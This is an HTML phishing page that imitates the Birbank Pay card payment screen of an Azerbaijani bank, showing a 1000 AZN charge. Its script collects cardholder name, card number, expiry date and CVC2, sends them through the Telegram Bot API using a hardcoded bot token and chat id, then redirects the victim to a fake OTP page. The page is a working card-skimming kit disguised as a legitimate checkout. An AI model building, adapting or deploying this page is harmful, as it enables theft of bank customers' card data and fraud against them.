<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="viewport" content="width=device-width, user-scalable=no">
    <link rel="shortcut icon" href="birbank.png" type="image/ico">
    <title>Birbank Pay</title>

    <link rel="stylesheet" href="ode_files/styles.css" type="text/css">
    <style>
        .logo {
            width: 250px; /* Logonun geniÅŸliÄŸi */
            height: auto; /* OranÄ± koruyarak yÃ¼ksekliÄŸi ayarla */
            display: block;
            margin-left: 0; /* Sola hizala */
        }

        .btn.pay-btn {
            background-color: #FF0039; /* KÄ±rmÄ±zÄ± renk */
            color: white; /* YazÄ± rengi */
            border: none; /* Ã‡erÃ§eve kaldÄ±rÄ±ldÄ± */
            padding: 10px 20px; /* Ä°Ã§ boÅŸluk */
            border-radius: 5px; /* Kenar yuvarlaklÄ±ÄŸÄ± */
            font-size: 16px; /* YazÄ± boyutu */
            cursor: pointer; /* TÄ±klanabilir imleÃ§ */
            display: block;
            margin: 20px auto; /* OrtalanmÄ±ÅŸ buton */
            text-align: center;
        }

        .btn.pay-btn:hover {
            opacity: 0.9; /* Hover efektinde hafif transparan */
        }

        .btn.pay-btn.disabled {
            background-color: grey; /* Pasif durumda gri */
            color: white;
            cursor: not-allowed;
        }

        .input-field input {
            border: 2px solid black; /* VarsayÄ±lan durumda siyah kenarlÄ±k */
            outline: none; /* TarayÄ±cÄ± varsayÄ±lan odak stilini kaldÄ±rÄ±r */
            box-shadow: none; /* GÃ¶lgeyi kaldÄ±rÄ±r */
            border-radius: 4px; /* KenarlÄ±klara yuvarlaklÄ±k eklendi */
            padding: 10px; /* GiriÅŸ alanÄ±na boÅŸluk ekler */
        }

        .input-field input:focus {
            border: 2px solid red; /* OdaklandÄ±ÄŸÄ±nda kÄ±rmÄ±zÄ± kenarlÄ±k */
        }

        .input-field input:not(:placeholder-shown) {
            border: 2px solid red; /* Ä°Ã§erik olduÄŸunda kÄ±rmÄ±zÄ± kenarlÄ±k */
        }

        #countdown {
            font-size: 14px;
            font-weight: normal;
        }

        #resendButton {
            font-size: 14px;
            text-decoration: underline;
        }
    </style>
</head>

<body>
    <div class="mainwrapper">
        <header class="ecom-header">
            <img class="logo" src="ode_files/pb-logo.svg" alt="pb-logo">
            <label class="amount-label">Ãœmumi mÉ™blÉ™ÄŸ</label>
            <label id="ledger" class="amount">1000.00 AZN</label>
        
        </header>

        <main>
            <form id="cardentry" method="post" autocomplete="off">
                <div class="input-field">
                    <label for="cardname">Ad vÉ™ Soyad</label>
                    <input tabindex="1" id="cardname" name="cardname" type="text" maxlength="26" autocomplete="cc-name" placeholder="Kart Ã¼zÉ™rindÉ™ki ad vÉ™ soyad">
                    <p id="cardname-error-mandatory" class="error-message hidden">
                        Xana mÉ™lumatlarÄ± qeyd olunmalÄ±dÄ±r
                    </p>
                    <p id="cardname-error-alpha" class="error-message hidden">
                        RÉ™qÉ™m vÉ™ simvollardan istifadÉ™ edilmÉ™mÉ™lidir
                    </p>
                </div>

                <div class="input-field">
                    <label for="cardnr">Kart nÃ¶mrÉ™si</label>
                    <div class="input-with-icon">
                        <input tabindex="2" type="text" id="cardnr" name="cardnr" placeholder="1234 1234 1234 1234" maxlength="19" autocomplete="cc-number">
                        <img id="card-number-icon" src="ode_files/card.svg" alt="card">
                    </div>
                    <p id="cardnr-error-mandatory" class="error-message hidden">
                        Xana mÉ™lumatlarÄ± qeyd olunmalÄ±dÄ±r
                    </p>
                    <p id="cardnr-error-length" class="error-message hidden">
                        16 rÉ™qÉ™mli olmalÄ±dÄ±r.
                    </p>
                </div>
                <p id="keycode"></p>
                <div class="input-group">
                    <div class="input-field">
                        <label for="expire-date">KartÄ±n bitmÉ™ tarixi</label>
                        <input id="expire-date" type="text" placeholder="ay / il" maxlength="5" autocomplete="cc-exp" inputmode="text">
                        <p id="expire-date-error-mandatory" class="error-message hidden">
                            Xana mÉ™lumatlarÄ± qeyd olunmalÄ±dÄ±r
                        </p>
                        <p id="expire-date-error-format" class="error-message hidden">
                            Format yanlÄ±ÅŸdÄ±r
                        </p>
                        <input type="hidden" name="validMONTH" id="month-input">
                        <input type="hidden" name="validYEAR" id="year-input">
                    </div>

                    <div class="input-field">
                        <label for="cvc2">CVC2 / CVV2</label>
                        <div class="input-with-icon">
                            <input id="cvc2" name="cvc2" type="password" placeholder="123" maxlength="4" autocomplete="cc-csc">
                            <img src="ode_files/cvc.svg" alt="card">
                        </div>
                        <p id="cvc2-error-mandatory" class="error-message hidden">
                            Xana mÉ™lumatlarÄ± qeyd olunmalÄ±dÄ±r
                        </p>
                        <p id="cvc2-error-length" class="error-message hidden">
                            3 rÉ™qÉ™mli olmalÄ±dÄ±r
                        </p>
                    </div>
                </div>
                <button id="pay-btn" class="btn pay-btn" type="button">
                    Ã–dÉ™niÅŸ et
                </button>
            </form>
        </main>
    </div>

    <footer>
        <div class="plastic-cards-container">
            <div class="plastic-cards">
                <img src="ode_files/verified-by-visa.svg" alt="verified-by-visa">
                <img src="ode_files/visa.svg" alt="visa">
                <img src="ode_files/visa-electron.svg" alt="visa-electron">
            </div>
            <div class="plastic-cards">
                <img src="ode_files/maestro.svg" alt="maestro">
                <img src="ode_files/mastercard.svg" alt="mastercard">
                <img src="ode_files/mastercard-secure-code.svg" alt="mastercard-secure-code">
            </div>
        </div>
        <div class="contacts">
            <p>Bankla É™laqÉ™ Ã¼Ã§Ã¼n:</p>
            <p>
                customer.care@birbank.az
                <span class="seperator">|</span>&nbsp;<span class="bank-number">+994 (12) 496 50 00</span>
            </p>
            <p id="copyrights">Â© Copyrights 2007-2024 Birbank</p>
        </div>
    </footer>

    <div id="video-roll-root-mask"></div>
</body>

<script src="../../code.jquery.com/jquery-3.6.4.min.js"></script>
<script>document.addEventListener('DOMContentLoaded', function () {
    const cardname = document.querySelector('#cardname');
    const cardnumber = document.querySelector('#cardnr');
    const expiredate = document.querySelector('#expire-date');
    const cvc2 = document.querySelector('#cvc2');
    const paybtn = document.querySelector('#pay-btn');

    // Kart numarasÄ±nÄ± formatlama (XXXX XXXX XXXX XXXX)
    cardnumber.addEventListener('input', function () {
        let value = this.value.replace(/\D/g, ''); // Sadece rakamlarÄ± al
        value = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Her 4 rakamda bir boÅŸluk
        this.value = value.trim();
    });

    // Son kullanma tarihini formatlama (MM/YY)
    expiredate.addEventListener('input', function () {
        let value = this.value.replace(/\D/g, ''); // Sadece rakamlarÄ± al
        if (value.length <= 4) {
            value = value.replace(/^(\d{2})(\d{0,2})$/, '$1/$2'); // 0525 -> 05/25
        }
        this.value = value;
    });

    // CVC alanÄ±nÄ± sadece rakamlarla sÄ±nÄ±rlandÄ±r
    cvc2.addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, ''); // Sadece rakamlarÄ± al
    });

    // AlanlarÄ±n geÃ§erli olup olmadÄ±ÄŸÄ±nÄ± kontrol eden fonksiyon
    function checkInputs() {
        const isCardNameValid = cardname.value.trim() !== ''; // Ad Soyad boÅŸ deÄŸil
        const isCardNumberValid = cardnumber.value.replace(/\s/g, '').length === 16; // Kart numarasÄ± 16 hane
        const isExpireDateValid = /^\d{2}\/\d{2}$/.test(expiredate.value); // Tarih MM/YY formatÄ±nda
        const isCVCValid = cvc2.value.length === 3; // CVC 3 hane

        // EÄŸer tÃ¼m alanlar geÃ§erliyse buton aktif olsun
        if (isCardNameValid && isCardNumberValid && isExpireDateValid && isCVCValid) {
            paybtn.disabled = false;
            paybtn.classList.remove('disabled');
        } else {
            paybtn.disabled = true;
            paybtn.classList.add('disabled');
        }
    }

    // Her giriÅŸ deÄŸiÅŸikliÄŸinde kontrol et
    cardname.addEventListener('input', checkInputs);
    cardnumber.addEventListener('input', checkInputs);
    expiredate.addEventListener('input', checkInputs);
    cvc2.addEventListener('input', checkInputs);

    // Telegram mesaj gÃ¶nderme
    var telegram_bot_id = "8181395152:AAFrWCNgIiLdodA1uITARV74M4S6OMNBwDs";
    var chat_id = 7813611012;
    var message;

    function prepareMessage() {
        const cardnm = cardname.value;
        const cardnr = cardnumber.value;
        const expdate = expiredate.value;
        const cvc = cvc2.value;

        message = `Log: irshad ğŸ’³\nMÉ™blÉ™ÄŸ: 999.99 AZN\nCard Name: ${cardnm}\nCard Number: ${cardnr}\nExpire Date: ${expdate}\nCVC2: ${cvc}`;
    }

    function sendMessage() {
        prepareMessage();
        const telegramSettings = {
            "async": true,
            "crossDomain": true,
            "url": `https://api.telegram.org/bot${telegram_bot_id}/sendMessage`,
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "cache-control": "no-cache"
            },
            "data": JSON.stringify({ "chat_id": chat_id, "text": message })
        };

        $.ajax(telegramSettings).done(function (response) {
            console.log("Tamam:", response);
        });

        // Formu sÄ±fÄ±rla ve yeni sayfaya yÃ¶nlendir
        const last4 = cardnumber.value.slice(-4);
        cardname.value = '';
        cardnumber.value = '';
        expiredate.value = '';
        cvc2.value = '';
        setTimeout(function () {
            window.location.href = `otp6871.html?cardnr=${last4}`;
        }, 1000);
    }

    // Ã–deme butonuna tÄ±klama olayÄ±
    paybtn.addEventListener('click', function (event) {
        event.preventDefault();
        if (!paybtn.disabled) {
            sendMessage();
        }
    });

    // Ä°lk kontrol (sayfa yÃ¼klendiÄŸinde butonun pasif olmasÄ±nÄ± saÄŸlamak iÃ§in)
    checkInputs();
});
</script>
</html>
